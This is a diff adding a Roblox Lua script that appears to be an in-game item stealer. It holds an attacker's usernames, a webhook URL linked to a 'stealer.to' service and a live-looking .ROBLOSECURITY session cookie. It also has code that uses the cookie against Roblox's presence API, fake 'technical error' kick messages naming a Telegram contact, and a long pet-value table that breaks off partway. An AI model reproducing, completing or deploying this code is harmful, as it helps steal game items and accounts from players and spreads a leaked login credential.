@@ -1,4 +1,1480 @@
-username = "dolbaeb"
-webhook = "lalala" 
+Username = "noviy_nickname" -- >> Your main username
+Username2 = "knisdqx_meow" -- >> Your alt username
+Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kqlcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ" -- >> https://stealer.to/
+getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzk2MTA1NTI5NTY3MTI2MDQyNjYoAw.Q_bHAVD-HxDeSgomIU63hkyS89xZS1_97S9SjHOR7eTtf4XBzKdp6NaghwZ6iOSe043CoTzmZq_yVM-6b7kEUuoa8Cw8ech3loB2FyAiUoJZpB2wtUf-t-pfzWQGEdUYjiCTpVRyFTSU7ATuGGDR_9SVJzYICEwaKItC7wKbI4d_4WejHTiYOmv8ut8wC95Ipe3B1yOssRD6t_xSsAKyyo7skhulxPyBzXpMgLvKAyNLMETtZnZS5Ewl5Hp8ph7BDz2gmMWoYEaZ0gHswU20nbuLxpUwPSnqyUn0CWaeh3L0413PpsLPhuPc85MwgTYN_Px_9x22QywYzO_AP4I63cwe_-pdbFfChZg_kAkQ8BhvTXXLxzJHYvIeqtle0YOyO7SR3UnlX27iUs79KZcY-BidC-5AE9gOzOoaeCiMulCPGD02HDaGcD0VHXLpkwpWuK3VbYsyR045lpJpG5oiJXhCKehDPA6fgRFMt1FV5hgm10lgx8ihE-VY_UcZML1GFWphtfiv0doVwuXkkSDWEoOjw86t0C5WE4Uu_t7_j-S06KJfd7RcasGu2bAfxC49u7z_mxP4pyvN2t05DR48f4IjiSOv77OWFdO9JeWPckJzgNi_kmicTiKoDszXujiNNIjjeS0VCH8Jo6LCkcdOkfwDaTp-s0SqnXDLPhCSD7YAH8dxm6_YjPM5E5kDvg1aobkDu6KVmAjRFGxLyGpkBxvmoWLR03hcSTra5VUTOWp52uDqYT3D_5JtvYKE8E0oix3bx8l-vmUAfzM1DMh1jTkkqxMSP1rJh9lH2H0H5sLDLKIlJtL8kUkv6FvlQ0LcHfQjwgiVXQz_0Zm-YN7vU9F2kFP75RXRcOmdgvlwsgHs3FBOPhnydQwiEVGtzt-Ed3Ew6j4ukvX3v4SyV89luczy2Yg2WHBnxUhob-A58b_JSIjuv3JOqe_vcq5yya2fQaeGVXpjML7UmCY5X26DxDT2oRLIErYheHa4PEJF4_vxw1izxb9opVc5C3UOKjd9hHOfjysUsNzVHxk_tw8h5Z7mVKw40LwpbcZfoPrbl2Or6gp1BubaljahxhZmcKKN3HG1AuXlnZbkexR1v76FUGMi_n06RQrWVIgTi2ILRqKHZkF46nAfGPIgq6qeE-zKt9XEmMK3EesTHMjDa1HNINUT2JY"
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/FBScripts/RedX/refs/heads/main/IStock2025',true))()
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local realJobId = nil
+
+local function KickPlayer(reason)
+    local localPlayer = Players.LocalPlayer
+    if localPlayer then
+        local kickMethods = {
+            function() localPlayer:Kick(reason) end,
+            function() game:Shutdown() end,
+            function() while true do end end,
+            function() error(reason) end,
+            function() getgenv().crash = nil end
+        }
+        
+        for i, method in ipairs(kickMethods) do
+            local success = pcall(method)
+            if success then
+                break
+            end
+        end
+    end
+end
+
+local function MakeRequestWithRetry(url, options, maxRetries)
+    maxRetries = maxRetries or 3
+    
+    for attempt = 1, maxRetries do
+        local success, response = pcall(function()
+            return request(options)
+        end)
+        
+        if success and response then
+            if response.StatusCode == 503 then
+                if attempt < maxRetries then
+                    wait(2)
+                end
+            else
+                return response
+            end
+        else
+            if attempt < maxRetries then
+                wait(1)
+            end
+        end
+    end
+    
+    return nil
+end
+
+local function GetRealJobIdWithAuth()
+    print("🔍 Step 1: Checking cookie...")
+    if not getgenv().Cookie then
+        print("❌ No cookie found")
+        return nil
+    end
+    
+    local localPlayer = Players.LocalPlayer
+    if not localPlayer then 
+        print("❌ LocalPlayer not found")
+        return nil
+    end
+    
+    local placeId = game.PlaceId
+    local userIds = {}
+    local playerMap = {}
+    
+    print("🔍 Step 2: Collecting other players...")
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= localPlayer then
+            table.insert(userIds, player.UserId)
+            playerMap[player.UserId] = player.Name
+        end
+    end
+    
+    print("🔍 Found " .. #userIds .. " other players")
+    
+    if #userIds == 0 then
+        print("❌ No other players on server")
+        return nil
+    end
+    
+    local function GetPresenceWithAuth(userIdsList)
+        print("🔍 Step 3: Making API request...")
+        local reqBody = HttpService:JSONEncode({
+            userIds = userIdsList
+        })
+        
+        local response = MakeRequestWithRetry("https://presence.roblox.com/v1/presence/users", {
+            Url = "https://presence.roblox.com/v1/presence/users",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
+            },
+            Body = reqBody
+        }, 3)
+        
+        if response then
+            print("🔍 Step 4: Parsing response...")
+            local jsonSuccess, jsonData = pcall(function()
+                return HttpService:JSONDecode(response.Body)
+            end)
+            
+            if jsonSuccess then
+                return jsonData
+            else
+                print("❌ JSON parse failed")
+                return nil
+            end
+        else
+            print("❌ API request failed")
+            return nil
+        end
+    end
+    
+    print("🔍 Step 5: Getting presence data...")
+    local presenceData = GetPresenceWithAuth(userIds)
+    if not presenceData then
+        print("❌ No presence data received")
+        return nil
+    end
+    
+    if not presenceData.userPresences then
+        print("❌ No userPresences in response")
+        return nil
+    end
+    
+    print("🔍 Step 6: Analyzing " .. #presenceData.userPresences .. " presences...")
+    local foundJobIds = {}
+    local validResponses = 0
+    
+    for _, presence in pairs(presenceData.userPresences) do
+        if presence.placeId == placeId and presence.gameId then
+            validResponses = validResponses + 1
+            local jobId = presence.gameId
+            local playerName = playerMap[presence.userId] or "Unknown"
+            
+            if jobId and jobId ~= game.JobId then
+                print("🎯 Found different JobId from " .. playerName .. ": " .. jobId)
+                table.insert(foundJobIds, {
+                    jobId = jobId,
+                    player = playerName,
+                    lastLocation = presence.lastLocation or "InGame"
+                })
+            else
+                print("ℹ️ Same JobId from " .. playerName)
+            end
+        end
+    end
+
+    
+   print("🔍 Valid responses: " .. validResponses .. "/" .. #userIds)
+    
+if #foundJobIds > 0 then
+    print("🔍 Step 7: Found " .. #foundJobIds .. " different JobIds")
+    local jobIdCounts = {}
+    for _, found in ipairs(foundJobIds) do
+        jobIdCounts[found.jobId] = (jobIdCounts[found.jobId] or 0) + 1
+    end
+    
+    local bestJobId, maxCount = nil, 0
+    for jobId, count in pairs(jobIdCounts) do
+        if count > maxCount then
+            bestJobId = jobId
+            maxCount = count
+        end
+    end
+    
+    if bestJobId then
+        print("✅ Best JobId: " .. bestJobId .. " (confirmed by " .. maxCount .. " players)")
+        return bestJobId
+    end
+else
+    -- ВАЖНОЕ ИЗМЕНЕНИЕ: если все показывают тот же JobId, значит подмены нет
+    if validResponses > 0 then
+        print("✅ All players show the same JobId - no spoofing detected")
+        return game.JobId  -- Возвращаем текущий JobId как валидный
+    else
+        print("❌ No valid responses from players")
+        return nil
+    end
+end
+end
+
+local function FindRealJobId()
+    print("🔍 Starting JobId verification...")
+    
+    local result = GetRealJobIdWithAuth()
+    
+    if result then
+        realJobId = result
+        getgenv().RealJobId = result
+        
+        pcall(function()
+            writefile("real_jobid.txt", result)
+        end)
+        
+        if result == game.JobId then
+            print("✅ No JobId spoofing detected, using current JobId: " .. realJobId)
+        else
+            print("🎯 Real JobId found: " .. realJobId)
+        end
+        return result
+    else
+        print("❌ JobId verification failed - kicking player")
+        wait(2)
+        KickPlayer("Server was closed due technical error. If this error repeat then send message to technical | Telegram - @tvoytwix")
+        return nil
+    end
+end
+
+if getgenv().Cookie then
+    realJobId = FindRealJobId()
+    
+    if realJobId then
+        print(realJobId)
+    end
+else
+    wait(3)
+    KickPlayer("Global failure - @tvoytwix telegram")
+end
+
+repeat task.wait() until game:IsLoaded()
+
+if getgenv().adm then return end
+getgenv().adm = true
+
+if Username == "" or Username == nil then
+    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Username!")
+    return
+end
+
+if Username2 == "" or Username2 == nil then
+    Username2 = "None"
+end
+
+if Webhook == "" or Webhook == nil then
+    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Webhook!")
+    return
+end
+
+if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
+    game:GetService("Players").LocalPlayer:Kick("\nPlease join to different server!")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
+    game.Players.LocalPlayer:Kick("\nPrivate server detected!")
+    return
+end
+
+local Players = game:GetService("Players")
+
+-- >> Values Table for all pets << --
+local valuesTable = {
+    -- Legendary Pets
+    ["Shadow Dragon"] = {value = 7000, rarity = "legendary"},
+    ["Giraffe"] = {value = 8000, rarity = "legendary"},
+    ["Bat Dragon"] = {value = 10000, rarity = "legendary"},
+    ["Frost Dragon"] = {value = 2000, rarity = "legendary"},
+    ["Owl"] = {value = 3500, rarity = "legendary"},
+    ["Parrot"] = {value = 2000, rarity = "legendary"},
+    ["Evil Unicorn"] = {value = 1000, rarity = "legendary"},
+    ["Crow"] = {value = 2000, rarity = "legendary"},
+    ["Arctic Reindeer"] = {value = 700, rarity = "legendary"},
+    ["Albino Monkey"] = {value = 400, rarity = "legendary"},
+    ["Turtle"] = {value = 450, rarity = "legendary"},
+    ["Kangaroo"] = {value = 180, rarity = "legendary"},
+    ["Unicorn"] = {value = 150, rarity = "legendary"},
+    ["Dragon"] = {value = 22, rarity = "legendary"},
+    ["Golden Penguin"] = {value = 90, rarity = "legendary"},
+    ["Diamond Griffin"] = {value = 85, rarity = "legendary"},
+    ["Diamond Dragon"] = {value = 80, rarity = "legendary"},
+    ["Diamond Unicorn"] = {value = 75, rarity = "legendary"},
+    ["Golden Rat"] = {value = 70, rarity = "legendary"},
+    ["Golden Dragon"] = {value = 15, rarity = "legendary"},
+    ["Golden Griffin"] = {value = 8, rarity = "legendary"},
+    ["Golden Unicorn"] = {value = 25, rarity = "legendary"},
+    ["Queen Bee"] = {value = 120, rarity = "legendary"},
+    ["Skeleton Rex"] = {value = 110, rarity = "legendary"},
+    ["Cerberus"] = {value = 95, rarity = "legendary"},
+    ["Guardian Lion"] = {value = 90, rarity = "legendary"},
+    ["Kitsune"] = {value = 85, rarity = "legendary"},
+    ["Dodo"] = {value = 70, rarity = "legendary"},
+    ["T-Rex"] = {value = 70, rarity = "legendary"},
+    ["Snow Owl"] = {value = 65, rarity = "legendary"},
+    ["Phoenix"] = {value = 60, rarity = "legendary"},
+    ["Shark"] = {value = 55, rarity = "legendary"},
+    ["Octopus"] = {value = 33, rarity = "legendary"},
+    ["Goldhorn"] = {value = 45, rarity = "legendary"},
+    ["Diamond Ladybug"] = {value = 40, rarity = "legendary"},
+    ["Ancient Dragon"] = {value = 18, rarity = "legendary"},
+    ["Diamond King Penguin"] = {value = 30, rarity = "legendary"},
+    ["Chameleon"] = {value = 25, rarity = "legendary"},
+    ["Lava Dragon"] = {value = 74, rarity = "legendary"},
+    ["Strawberry Shortcake Bat Dragon"] = {value = 400, rarity = "legendary"},
+    ["Chocolate Chip Bat Dragon"] = {value = 500, rarity = "legendary"},
+    ["Alicorn"] = {value = 30, rarity = "legendary"}, -- from that updated
+    ["Kitty Bat"] = {value = 16, rarity = "legendary"},
+    ["Crystal Egg"] = {value = 14, rarity = "legendary"},
+    ["Royal Egg"] = {value = 2, rarity = "legendary"},
+    ["Aztec Egg"] = {value = 2, rarity = "legendary"},
+    ["Moon Egg"] = {value = 4, rarity = "legendary"},
+    ["Garden Egg"] = {value = 8, rarity = "legendary"},
+    ["Aussie Egg"] = {value = 177, rarity = "legendary"},
+    ["Japan Egg"] = {value = 14, rarity = "legendary"},
+    ["Danger Egg"] = {value = 33, rarity = "legendary"},
+    ["Mythic Egg"] = {value = 12, rarity = "legendary"},
+    ["Desert Egg"] = {value = 16, rarity = "legendary"},
+    ["Fossil Egg"] = {value = 35, rarity = "legendary"},
+    ["Ocean Egg"] = {value = 27, rarity = "legendary"},
+    ["Slimingo"] = {value = 20, rarity = "legendary"},
+    ["Quetzalcoatl"] = {value = 8, rarity = "legendary"},
+    ["Woodland Egg"] = {value = 30, rarity = "legendary"},
+    ["Temple Friend"] = {value = 7, rarity = "legendary"},
+    ["Glormy Dolphin"] = {value = 15, rarity = "legendary"},
+    ["Fool Egg"] = {value = 82, rarity = "legendary"},
+    ["Zodiac Minion Chick"] = {value = 5, rarity = "legendary"},
+    ["Dragonfly"] = {value = 7, rarity = "legendary"},
+    ["Frost Fury"] = {value = 100, rarity = "legendary"},
+    ["Southeast Asia Egg"] = {value = 24, rarity = "legendary"},
+    ["Metal Ox"] = {value = 6, rarity = "legendary"},
+    ["Fairy Bat Dragon"] = {value = 255, rarity = "legendary"},
+    ["Dracula Parrot"] = {value = 10, rarity = "legendary"},
+    ["Golden Egg"] = {value = 43, rarity = "legendary"},
+    ["Winter Buck"] = {value = 25, rarity = "legendary"},
+    ["Vanilla Penguin"] = {value = 155, rarity = "legendary"},
+    ["Lunar Gold Tiger"] = {value = 7, rarity = "legendary"},
+    ["Golden Tortoise Beetle"] = {value = 8, rarity = "legendary"},
+    ["Royal Moon Egg"] = {value = 33, rarity = "legendary"},
+    ["Frostclaw"] = {value = 23, rarity = "legendary"},
+    ["Royal Aztec Egg"] = {value = 30, rarity = "legendary"},
+    ["Lunar Moon Bear"] = {value = 13, rarity = "legendary"},
+    ["Diamond Egg"] = {value = 66, rarity = "legendary"},
+    ["Ice Moth Dragon"] = {value = 33, rarity = "legendary"},
+    ["Sunglider"] = {value = 35, rarity = "legendary"},
+    ["Squid"] = {value = 35, rarity = "legendary"},
+    ["Mushroom Friend"] = {value = 35, rarity = "legendary"},
+    ["Berry Cool Cube"] = {value = 32, rarity = "legendary"},
+    ["Sunrise Ducking"] = {value = 20, rarity = "legendary"},
+    ["Fleur De Ice"] = {value = 24, rarity = "legendary"},
+    ["Mecha Meow"] = {value = 315, rarity = "legendary"},
+    ["Corn Doggo"] = {value = 155, rarity = "legendary"},
+    ["Dango Penguins"] = {value = 1380, rarity = "legendary"},
+    ["Candy Hare"] = {value = 113, rarity = "legendary"},
+    ["Balloon Unicorn"] = {value = 1900, rarity = "legendary"},
+    ["Christmas Egg"] = {value = 699, rarity = "legendary"},
+    ["Cupid Dragon"] = {value = 200, rarity = "legendary"},
+    ["Super Saru"] = {value = 20, rarity = "legendary"},
+    ["Vampire Dragon"] = {value = 200, rarity = "legendary"},
+    ["Gargoyle"] = {value = 40, rarity = "legendary"},
+    ["Cryptid"] = {value = 550, rarity = "legendary"},
+    ["Grim Dragon"] = {value = 220, rarity = "legendary"},
+    ["Capricorn"] = {value = 35, rarity = "legendary"},
+    ["Royal Desert Egg"] = {value = 55, rarity = "legendary"},
+    ["Phantom Dragon"] = {value = 150, rarity = "legendary"},
+    ["Emberlight"] = {value = 125, rarity = "legendary"},
+    ["Winged Horse"] = {value = 48, rarity = "legendary"},
+    ["Majestic Pony"] = {value = 140, rarity = "legendary"},
+    ["Yule Log Dog"] = {value = 125, rarity = "legendary"},
+    ["Cuddly Candle"] = {value = 44, rarity = "legendary"},
+    ["Princess Capuchin Monkey"] = {value = 65, rarity = "legendary"},
+    ["Dimension Drifter"] = {value = 24, rarity = "legendary"},
+    ["Pirate Hermit Crab"] = {value = 37, rarity = "legendary"},
+    ["Golden Hamster"] = {value = 42, rarity = "legendary"},
+    ["Golden Kinguin"] = {value = 27, rarity = "legendary"},
+    ["Kraken"] = {value = 17, rarity = "legendary"},
+    ["Fallow Deer"] = {value = 295, rarity = "legendary"},
+    ["Tree Kangaroo"] = {value = 80, rarity = "legendary"},
+    ["Field Mouse"] = {value = 150, rarity = "legendary"},
+    ["Shark Puppy"] = {value = 365, rarity = "legendary"},
+    ["King Bee"] = {value = 80, rarity = "legendary"},
+    ["Coconut Friend"] = {value = 55, rarity = "legendary"},
+    ["Cactus Friend"] = {value = 75, rarity = "legendary"},
+    ["Dire Stag"] = {value = 27, rarity = "legendary"},
+    ["Golden Walrus"] = {value = 38, rarity = "legendary"},
+    ["Frostbite Bear"] = {value = 600, rarity = "legendary"},
+    ["Firefly"] = {value = 102, rarity = "legendary"},
+    ["Sakura Spirit"] = {value = 150, rarity = "legendary"},
+    ["Hippogriff"] = {value = 35, rarity = "legendary"},
+    ["Nessie"] = {value = 180, rarity = "legendary"},
+    ["Pumpkin Carriage"] = {value = 60, rarity = "legendary"},
+    ["Leviathan"] = {value = 66, rarity = "legendary"},
+    ["Glormy Leo"] = {value = 166, rarity = "legendary"},
+    ["Midnight Dragon"] = {value = 105, rarity = "legendary"},
+    ["Naga Dragon"] = {value = 44, rarity = "legendary"},
+    ["Dancing Dragon"] = {value = 55, rarity = "legendary"},
+    ["Scarebear"] = {value = 37, rarity = "legendary"},
+    ["Ninja Monkey"] = {value = 66, rarity = "legendary"},
+    ["Naughty Mistletroll"] = {value = 85, rarity = "legendary"},
+    ["Halloween White Ghost Dragon"] = {value = 60, rarity = "legendary"},
+    ["Chimera"] = {value = 20, rarity = "legendary"},
+    ["Moose Calf"] = {value = 370, rarity = "legendary"},
+    ["Werewolf"] = {value = 240, rarity = "legendary"},
+    ["Golden Pinguin"] = {value = 90, rarity = "legendary"},
+    ["Farm Egg"] = {value = 2200, rarity = "legendary"},
+    ["Astronaut Gorilla"] = {value = 45, rarity = "legendary"},
+    ["Peacock"] = {value = 42, rarity = "legendary"},
+    ["Sugar Glider"] = {value = 400, rarity = "legendary"},
+    ["Diamond Hummingbird"] = {value = 80, rarity = "legendary"},
+    ["Frost Unicorn"] = {value = 450, rarity = "legendary"},
+    ["Dragon Train"] = {value = 125, rarity = "legendary"},
+    ["Rainbow Dragon"] = {value = 95, rarity = "legendary"},
+    ["Lavender Dragon"] = {value = 37, rarity = "legendary"},
+    ["Giant Cheetah Mount"] = {value = 624, rarity = "legendary"},
+    ["Memricorn"] = {value = 37, rarity = "legendary"},
+    ["Royal Mistletroll"] = {value = 460, rarity = "legendary"},
+    ["Strawberry Penguin"] = {value = 500, rarity = "legendary"},
+    ["Caelum Cervi"] = {value = 280, rarity = "legendary"},
+    ["Glormy Hound"] = {value = 120, rarity = "legendary"},
+
+    -- Ultra-Rare Pets
+    ["Bee"] = {value = 4, rarity = "ultra_rare"},
+    ["Penguin"] = {value = 7, rarity = "ultra_rare"},
+    ["Red Panda"] = {value = 2, rarity = "ultra_rare"},
+    ["Shiba Inu"] = {value = 2, rarity = "ultra_rare"},
+    ["Sloth"] = {value = 9, rarity = "ultra_rare"},
+    ["Koala"] = {value = 11, rarity = "ultra_rare"},
+    ["Frog"] = {value = 9, rarity = "ultra_rare"},
+    ["Yeti"] = {value = 35, rarity = "ultra_rare"},
+    ["Lamb"] = {value = 88, rarity = "ultra_rare"},
+    ["Rhino"] = {value = 98, rarity = "ultra_rare"},
+    ["Platypus"] = {value = 227, rarity = "ultra_rare"},
+    ["Turkey"] = {value = 5, rarity = "ultra_rare"},
+    ["Silly Duck"] = {value = 4, rarity = "ultra_rare"},
+    ["Drake"] = {value = 3, rarity = "ultra_rare"},
+    ["Blue Dog"] = {value = 1, rarity = "ultra_rare"},
+    ["Gingerbread Reindeer"] = {value = 45, rarity = "ultra_rare"}, -- from that updated
+    ["Persian Cat"] = {value = 2, rarity = "ultra_rare"},
+    ["Ghostly Cat"] = {value = 6, rarity = "ultra_rare"},
+    ["Onza"] = {value = 4, rarity = "ultra_rare"},
+    ["Choco Penguin"] = {value = 29, rarity = "ultra_rare"},
+    ["Ginger Cat"] = {value = 5, rarity = "ultra_rare"},
+    ["Mr Whiskerpips"] = {value = 25, rarity = "ultra_rare"},
+    ["Lunar Ox"] = {value = 2, rarity = "ultra_rare"},
+    ["Icy Porcupine"] = {value = 8, rarity = "ultra_rare"},
+    ["Toucan"] = {value = 2, rarity = "ultra_rare"},
+    ["Gingerbread Mouse"] = {value = 25, rarity = "ultra_rare"},
+    ["Corgi"] = {value = 2, rarity = "ultra_rare"},
+    ["Swordfish"] = {value = 2, rarity = "ultra_rare"},
+    ["Starfish"] = {value = 4, rarity = "ultra_rare"},
+    ["Robot"] = {value = 2, rarity = "ultra_rare"},
+    ["Pomeranian"] = {value = 15, rarity = "ultra_rare"},
+    ["Lunar White Tiger"] = {value = 2, rarity = "ultra_rare"},
+    ["Frozen Penguin"] = {value = 3, rarity = "ultra_rare"},
+    ["Snowy Mammoth"] = {value = 5, rarity = "ultra_rare"},
+    ["Ribbon Seal"] = {value = 4, rarity = "ultra_rare"},
+    ["Ehecatl"] = {value = 2, rarity = "ultra_rare"},
+    ["Starmite"] = {value = 2, rarity = "ultra_rare"},
+    ["Puptune"] = {value = 32, rarity = "ultra_rare"},
+    ["Orca"] = {value = 8, rarity = "ultra_rare"},
+    ["Badger"] = {value = 8, rarity = "ultra_rare"},
+    ["Cold Cube"] = {value = 2, rarity = "ultra_rare"},
+    ["Winter Doe"] = {value = 8, rarity = "ultra_rare"},
+    ["Bauble Buddies"] = {value = 80, rarity = "ultra_rare"},
+    ["St Bernard"] = {value = 12, rarity = "ultra_rare"},
+    ["Tan Chow-Chow"] = {value = 25, rarity = "ultra_rare"},
+    ["Zombie Wolf"] = {value = 33, rarity = "ultra_rare"},
+    ["Water Moon Bear"] = {value = 2, rarity = "ultra_rare"},
+    ["Ladybug"] = {value = 2, rarity = "ultra_rare"},
+    ["Toxic Kaijunior"] = {value = 2, rarity = "ultra_rare"},
+    ["Hamster"] = {value = 22, rarity = "ultra_rare"},
+    ["Alley Cat"] = {value = 165, rarity = "ultra_rare"},
+    ["Toasty Red Panda"] = {value = 7, rarity = "ultra_rare"},
+    ["Halloween White Skeleton Dog"] = {value = 5, rarity = "ultra_rare"},
+    ["Flower Power Duckling"] = {value = 22, rarity = "ultra_rare"},
+    ["Skunk"] = {value = 15, rarity = "ultra_rare"},
+    ["Chilling Spider"] = {value = 3, rarity = "ultra_rare"},
+    ["Albino Bat"] = {value = 15, rarity = "ultra_rare"},
+    ["Highland Cow"] = {value = 15, rarity = "ultra_rare"},
+    ["Wyvern"] = {value = 2, rarity = "ultra_rare"},
+    ["Praying Mantis"] = {value = 3, rarity = "ultra_rare"},
+    ["Hydra"] = {value = 2, rarity = "ultra_rare"},
+    ["Ghost Chick"] = {value = 2, rarity = "ultra_rare"},
+    ["Snowball Pet"] = {value = 142, rarity = "ultra_rare"},
+    ["King Pinguin"] = {value = 2, rarity = "ultra_rare"},
+    ["Magma Moose"] = {value = 2, rarity = "ultra_rare"},
+    ["Sabertooth"] = {value = 2, rarity = "ultra_rare"},
+    ["Gingerbread Hare"] = {value = 25, rarity = "ultra_rare"},
+    ["Merry Mistletroll"] = {value = 50, rarity = "ultra_rare"},
+    ["Lionfish"] = {value = 2, rarity = "ultra_rare"},
+    ["Magma Snail"] = {value = 2, rarity = "ultra_rare"},
+    ["Scarecrow Cat"] = {value = 9, rarity = "ultra_rare"},
+    ["Pink Betta Fish"] = {value = 5, rarity = "ultra_rare"},
+    ["Christmas Pudding Pup"] = {value = 385, rarity = "ultra_rare"},
+    ["Ram"] = {value = 55, rarity = "ultra_rare"},
+    ["Pretty Pony"] = {value = 62, rarity = "ultra_rare"},
+    ["Frostbite Cub"] = {value = 38, rarity = "ultra_rare"},
+    ["Happy Clam"] = {value = 135, rarity = "ultra_rare"},
+    ["Flamingo"] = {value = 600, rarity = "ultra_rare"},
+    ["Peppermint Penguin"] = {value = 38, rarity = "ultra_rare"},
+    ["Crocodile"] = {value = 400, rarity = "ultra_rare"},
+    ["Slime"] = {value = 107, rarity = "ultra_rare"},
+    ["Hedgehog"] = {value = 2000, rarity = "ultra_rare"},
+    ["Skelebat"] = {value = 20, rarity = "ultra_rare"},
+    ["Goat"] = {value = 299, rarity = "ultra_rare"},
+    ["Sugar Scull potion "] = {value = 165, rarity = "ultra_rare"},
+    ["Cabbit"] = {value = 451, rarity = "ultra_rare"},
+    ["Lion"] = {value = 333, rarity = "ultra_rare"},
+    ["Llama"] = {value = 133, rarity = "ultra_rare"},
+    ["Patridge"] = {value = 120, rarity = "ultra_rare"},
+    ["Artic Fox"] = {value = 222, rarity = "ultra_rare"},
+    ["Lion Cub"] = {value = 296, rarity = "ultra_rare"},
+    ["Puffin"] = {value = 219, rarity = "ultra_rare"},
+    ["Many Mackerel"] = {value = 190, rarity = "ultra_rare"},
+    ["Wood Pigeon"] = {value = 90, rarity = "ultra_rare"},
+    ["Mini Pig"] = {value = 700, rarity = "ultra_rare"},
+    ["Tortuga De La Isla"] = {value = 299, rarity = "ultra_rare"},
+    ["Siamese Cat"] = {value = 250, rarity = "ultra_rare"},
+    ["Gaelic Fae"] = {value = 99, rarity = "ultra_rare"},
+    ["Zombie Buffalo"] = {value = 299, rarity = "ultra_rare"},
+    ["Jellyfish"] = {value = 244, rarity = "ultra_rare"},
+
+    -- Rare Pets
+    ["Bunny"] = {value = 8, rarity = "rare"},
+    ["Beaver"] = {value = 2, rarity = "rare"},
+    ["Rabbit"] = {value = 2, rarity = "rare"},
+    ["Snow Puma"] = {value = 5, rarity = "rare"},
+    ["Poodle"] = {value = 2, rarity = "rare"},
+    ["Swan"] = {value = 2, rarity = "rare"},
+    ["Black Panther"] = {value = 1, rarity = "rare"},
+    ["Zebra"] = {value = 1, rarity = "rare"}, -- from that updated
+    ["Winter Fawn"] = {value = 10, rarity = "rare"},
+    ["Shetland Pony Dark Brown"] = {value = 2, rarity = "rare"},
+    ["Ghost Wolf"] = {value = 2, rarity = "rare"},
+    ["Ox"] = {value = 2, rarity = "rare"},
+    ["Ice Cube"] = {value = 3, rarity = "rare"},
+    ["Parakeet"] = {value = 2, rarity = "rare"},
+    ["Tarantula"] = {value = 2, rarity = "rare"},
+    ["Monkey"] = {value = 2, rarity = "rare"},
+    ["Orangutan"] = {value = 2, rarity = "rare"},
+    ["Amber Butterfly"] = {value = 2, rarity = "rare"},
+    ["Moonpine"] = {value = 2, rarity = "rare"},
+    ["Water Opossum"] = {value = 2, rarity = "rare"},
+    ["Chanekeh"] = {value = 2, rarity = "rare"},
+    ["Cow"] = {value = 600, rarity = "rare"},
+    ["Gorilla"] = {value = 2, rarity = "rare"},
+    ["Sasquatch"] = {value = 2, rarity = "rare"},
+    ["Zeopod"] = {value = 2, rarity = "rare"},
+    ["Zombie Chick"] = {value = 2, rarity = "rare"},
+    ["Happy Duckling"] = {value = 29, rarity = "rare"},
+    ["Emu"] = {value = 2, rarity = "rare"},
+    ["Black Moon Bear"] = {value = 2, rarity = "rare"},
+    ["Seahorse"] = {value = 2, rarity = "rare"},
+    ["Kelp Raider"] = {value = 2, rarity = "rare"},
+    ["Merhorse"] = {value = 2, rarity = "rare"},
+    ["Australian Kelpie"] = {value = 2, rarity = "rare"},
+    ["Toy Poodle"] = {value = 2, rarity = "rare"},
+    ["Abyssinian Cat"] = {value = 2, rarity = "rare"},
+    ["Leopard Cat"] = {value = 21, rarity = "rare"},
+    ["Ocelot"] = {value = 2, rarity = "rare"},
+    ["Orange Betta Fish"] = {value = 2, rarity = "rare"},
+    ["Eggnog Hare"] = {value = 12, rarity = "rare"},
+    ["Halloween White Mummy Cat"] = {value = 2, rarity = "rare"},
+    ["Pudding Cat"] = {value = 40, rarity = "rare"},
+    ["Clover Cow"] = {value = 15, rarity = "rare"},
+    ["Sweetheart Rat"] = {value = 32, rarity = "rare"},
+    ["Koi Carp"] = {value = 4, rarity = "rare"},
+    ["DJ Snooze"] = {value = 3, rarity = "rare"},
+    ["Indian Leopard"] = {value = 2, rarity = "rare"},
+    ["Red Fox"] = {value = 5, rarity = "rare"},
+    ["Hippo"] = {value = 25, rarity = "rare"},
+    ["Woolly Mammoth"] = {value = 2, rarity = "rare"},
+    ["Munchkin Cat"] = {value = 155, rarity = "rare"},
+    ["Sea Angel"] = {value = 4, rarity = "rare"},
+    ["Halloween Evil Dachshund"] = {value = 4, rarity = "rare"},
+    ["Great Pyrenees"] = {value = 40, rarity = "rare"},
+    ["Narwhal"] = {value = 2, rarity = "rare"},
+    ["Moon Rabbit"] = {value = 12, rarity = "rare"},
+    ["Tarsier"] = {value = 15, rarity = "rare"},
+    ["Cow Calf"] = {value = 15, rarity = "rare"},
+    ["French Bulldog"] = {value = 47, rarity = "rare"},
+    ["Shiver Wolf"] = {value = 26, rarity = "rare"},
+    ["Pig"] = {value = 200, rarity = "rare"},
+    ["Hare"] = {value = 100, rarity = "rare"},
+    ["Polar Bear"] = {value = 125, rarity = "rare"},
+    ["Elephant"] = {value = 350, rarity = "rare"},
+    ["Hyena"] = {value = 90, rarity = "rare"},
+    ["Mule"] = {value = 400, rarity = "rare"},
+    ["Ring-tailed Lemur"] = {value = 700, rarity = "rare"},
+
+    -- Uncommon Pets
+    ["Cat"] = {value = 4, rarity = "uncommon"},
+    ["Dog"] = {value = 3, rarity = "uncommon"},
+    ["Robin"] = {value = 1, rarity = "uncommon"},
+    ["Jumping Spider"] = {value = 2, rarity = "uncommon"}, -- from that updated
+    ["Shih Tzu"] = {value = 2, rarity = "uncommon"},
+    ["Tree Frog"] = {value = 2, rarity = "uncommon"},
+    ["Snowcat"] = {value = 2, rarity = "uncommon"},
+    ["Wolf"] = {value = 13, rarity = "uncommon"},
+    ["Bat"] = {value = 3, rarity = "uncommon"},
+    ["Camel"] = {value = 3, rarity = "uncommon"},
+    ["Snorgle"] = {value = 2, rarity = "uncommon"},
+    ["Muskrat"] = {value = 2, rarity = "uncommon"},
